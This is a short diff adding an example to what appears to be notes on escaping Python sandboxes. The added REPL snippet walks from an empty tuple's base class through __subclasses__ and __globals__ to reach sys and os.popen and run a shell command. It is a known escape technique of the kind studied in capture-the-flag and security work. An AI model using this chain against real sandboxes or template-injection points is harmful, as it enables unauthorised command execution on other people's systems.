@@ -19,4 +19,10 @@
 <built-in function system>
 ```
 
+```
+>>> ().__class__.__base__.__subclasses__()[504].__init__.__globals__['sys'].version
+3.5.2 (default, Nov 23 2017, 16:37:01) [GCC 5.4.0 20160609]
+>>> ().__class__.__base__.__subclasses__()[504].__init__.__globals__['sys'].modules['os'].popen('ls').read()
+```
+
 - indices can be different
